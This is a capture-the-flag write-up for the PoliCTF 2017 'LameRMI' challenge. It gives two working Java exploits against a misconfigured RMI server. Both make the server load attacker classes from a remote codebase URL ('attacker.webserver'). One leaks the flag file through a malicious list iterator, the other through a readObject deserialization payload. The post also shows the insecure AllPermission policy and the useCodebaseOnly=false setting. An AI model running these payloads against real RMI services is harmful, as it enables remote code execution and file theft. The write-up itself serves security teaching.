---
title:      PoliCTF 2017 - Lamermi
date:       2017-07-12 07:00:00
summary:    Exploting a wildly misconfigured RMI server
categories: PoliCTF Pwnable
author:     vigliag + mortic
tags:
 - PoliCTF
 - Pwn
 - Java
 - RMI
 - 2017
---

# LameRMI Writeup

LameRMI is a java/rmi pwning challenge written for 2017 edition of PoliCTF.

We know of two solutions to this challenge, this post details the one by the challenge's author, and an alternative one by another ToH member.

Unfortunately, due to a bug in the start script, this challenge only became fully operative some hours after the beginning of the CTF. Interestingly, the alternative solution (the one we scripted and used to check the challenge was up) worked, as it didn't depend on the benign functionalities of the server at all.

### Description

- Bill is a computer science student
- Bill managed to lock himself out of his own vps again
- Bill remembers that a small program he wrote to understand RMI is still running on the server, and that to get it working he's blindly copypasted snippets from stackoverflow and its professors slides. Maybe there's still hope of getting the flag he left there.
- Please help Bill

Url: `lamermi.chall.polictf.it`

#### Hints/Updates:

1. Pay attention that "http://" is not written anywhere (read the description!)
2. I heard that Bill's security policy is not that strict...
3. There's a webserver running on port 8000 as well. You may (or may not) need it.

## Author's solution

### Information gathering

- Running nmap on the server, you can find two open ports: 1099 (as expected), corresponding to an rmi registry, and an http server on port 8000
- the http server contains a class file (which you can decompile with IntelliJ Idea) with the `AverageService` interface

```java
public interface AverageService extends Remote {
    Double average(List<Integer> integerList) throws RemoteException;
}
```

Documentation for RMI itself is available at the oracle website. The tutorial is available here: https://docs.oracle.com/javase/tutorial/rmi/overview.html

A good first step is querying the RMI registry for a list of exposed services:

```java
Registry registry = LocateRegistry.getRegistry("lamermi.chall.polictf.it", 1099);
System.out.println("registry found");

String[] ports = registry.list();
for (String port: ports) {
    System.out.println(port);
}
// prints "AverageService"
```

Using the previously found interface, we can also make queries to AverageService in the following way

```java
AverageService averageService = (AverageService) registry.lookup("AverageService");
ArrayList<Integer> myIntList = new ArrayList<Integer>();
myIntList.add(1);
myIntList.add(2);
myIntList.add(3);
System.out.println(averageService.average(myIntList)); // prints "2.0"
```

### Finding the vulnerability

The text says that the RMI application was built by a student in a hurry, following tutorials and blindly copypasting
code snippets. Since it is fairly difficult to accidentally insert vulnerabilities in java code (much less in a service
whose only input is a list of integers), the vulnerability must lie in a misconfiguration.

Skimming again the RMI tutorial, we can gather that RMI has a mechanism for loading missing classes from an external codebase over http. This behaviour is useful when the client and the server exchange (as parameters or return values)
concrete implementations of the interfaces the service defines. Normally there are security policies in place, ensuring
that code can only be loaded from certain places, and can only execute with specific permission, but since we're talking
about a server misconfiguration, trying to exploit RMI class loading is certainly worth giving a shot.

The way we'll perform the exploit is by writing our own implementation of List<Integer>, and providing the class file to
the server via a public http server of our own. If we're lucky, the server will make use of the codebase our client provides, and will load our malicious classes.

```bash
# running our client (the exploit), note the codebase url we're telling the server to use 
java -Djava.rmi.server.codebase=http://my.server.with.malicious.mylist.class/ it.polictf.lamermi.Exploit
```

### Writing the exploit

The following is the actual exploit code. We'll write a myList class with a malicious iterator method (although other methods are fine as well), and exfiltrate
the flag by throwing an exception, which will be propagated to the client.

```java
public class Exploit {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("lamermi.chall.polictf.it", 1099);
        System.out.println("registry found");
        AverageService averageService = (AverageService) registry.lookup("AverageService");
        System.out.println("average service found");

        List<Integer> l = new myList<>();
        System.out.println("sending exploit");
        Double result = averageService.average(l);
        
        System.out.println(result);
    }
}
```

```java
public class myList<E> implements List<E>, Serializable {
    public static final long serialVersionUID = 42L;
    
	//... other ovverrides
	
    @Override public Iterator<E> iterator() {
        try{
            String content = new String(Files.readAllBytes(Paths.get("flag")));
            throw new Error(content);
        } catch (Exception e) {
            throw new Error(e);
        }
    }
	
	//... other ovverrides
}
```

### About the vulnerability:

The server is vulnerable because of two pieces of configuration. The first one is this very permissive security policy,
which is not hard at all to find on the web and in stackoverflow questions.

```
grant {
    permission java.security.AllPermission;
};
```

The second vulnerability is admittedly less common, but you can still find it in stackoverflow answers. RMI has a
[java.rmi.server.useCodebaseOnly property](http://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html) (defaulting to true since java7), which tells the server _not_ to use codebases provided by clients. Setting it to false restores the old and insecure behaviour:

```bash
# Command we used to launch the server, note the useCodeBaseOnly flag
java \
 -Djava.security.policy=security.policy \
 -Djava.rmi.server.useCodebaseOnly=false \
 -Djava.rmi.server.hostname=lamermi.chall.polictf.it \
 -jar lamermi-1.0-SNAPSHOT.jar
``` 

## [Mortic's](https://ctftime.org/user/22776) writeup

### Provided informations

Our target is an RMI registry at a given URL

### Information gathering

We can start by scanning the server for RmiRegistries with nmap, [which has a built-in script](https://nmap.org/nsedoc/scripts/rmi-dumpregistry.html) for that!

```
nmap --script rmi-dumpregistry.nse -sV --version-all -p 1099 lamermi.chall.polictf.it
```

We can suppose the port to be 1099 as it is the default port for RMI, a quick scan of the server would have shown that this hypothesis is correct.

There is a web server on port 8000 too that offers an interface: `AverageService` but playing with it doesn't show anything interesting.

Searching around the internet I found that RMI serializes all the objects that are sent from a client to a RmiRegistry. Java deserialization process invokes a method of the objects it is reconstructing __before__ any other check by the program takes place.

The method is `private void readObject(java.io.ObjectInputStream in)` and it can be overridden in any object implementing the Serializable interface. On deserializing, as it should happen, all the code in that method will be executed, so we can have a possible remote code execution by requesting the registry to deserialize a Java object.

But it's not that easy, as the code for the Java object we want to deserialize (including the `readObject` method) must be already available to the server. There are some well known exploits that rely on java deserialization, and on the misuse of the `readObject` method of certain libraries already in the server's classpath (see [here](https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles), [here](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)  and [here](https://www.integrigy.com/files/Integrigy%20Oracle%20Java%20Deserialization%20Vulnerabilities.pdf) for instance), but we won't need to make use of that.

Searching for the Oracle documentation we can find a feature that allows a RmiRegistry to dynamically load new classes if a server cannot resolve a class he can ask a web server its implementation, exactly what we needed!

If the RmiRegistry security policies are not configured correctly (ie. they allow all, and the `java.rmi.server.useCodebaseOnly` property is set to false) it is the __client__ who can specify an http codebase for the server to use, by means of the `java.rmi.server.codebase` flag.

```
-Djava.rmi.server.codebase=http://attacker.webserver/folder
```

Now that the server has a way to access the compiled binary of our exploit class, and its `readObject` method, the only thing we need to do to cause RMI to deserialize our exploit is just attempting to bind our exploit class as a new service on the RMI registry.

```java
register.bind("New service", exploit_class);
```

Note that the binding of new services from the client is not allowed but the object will be de-serialised __before__ that check is made by the system!

### The exploit

*Console command*
```
java -Djava.rmi.server.codebase=http://attacker.webserver/folder Main
```

*Main class*
```java
public static void main(String args[]) {

  AverageService service = null;
  Registry reg1 = null;
  Remote p = new Payload();

  String host = args[0];
  int port = Integer.parseInt(args[1]);

  System.out.println("Searching registry at "+host+":"+port);

  try {
      reg1 = LocateRegistry.getRegistry(host,port);
  } catch (RemoteException e) {
      System.out.println("No registry   found!\nAborting...");
      e.printStackTrace();
      return;
  } finally {
      System.out.println("Registry found!");
  }

  System.out.println("Starting exploit...");
  try {
      reg1.bind("new service", p);
  } catch (RemoteException | AlreadyBoundException e) {
      System.out.println(e.getMessage());
  }
}
```

*Exploit class*
```java
public class Exploit implements Remote, Serializable {
  public void exploit() throws IOException {
      /*
       Cat flag is not java enough
      */
      BufferedReader br = new BufferedReader(new FileReader("flag"));
      try {
          StringBuilder sb = new StringBuilder();
          String line = br.readLine();

          while (line != null) {
              sb.append(line);
              sb.append(System.lineSeparator());
              line = br.readLine();
          }
          String everything = sb.toString();
          /*
            We cannot use System.out to print the string
            so I decided to insert the result of the exploit inside
             an exception.
            All the unhandled exceptions are kindly sent back to the client.
          */
          IOException e = new
          IOException(everything);
          throw e;
      } finally {
          br.close();
      }
  }

  private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
      exploit();
      in.defaultReadObject();
  }
}
```

### References

- [AppSecCali 2015 - Marshalling Pickles](https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles)
- [What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [Oracle Java Deserialization](https://www.integrigy.com/files/Integrigy%20Oracle%20Java%20Deserialization%20Vulnerabilities.pdf)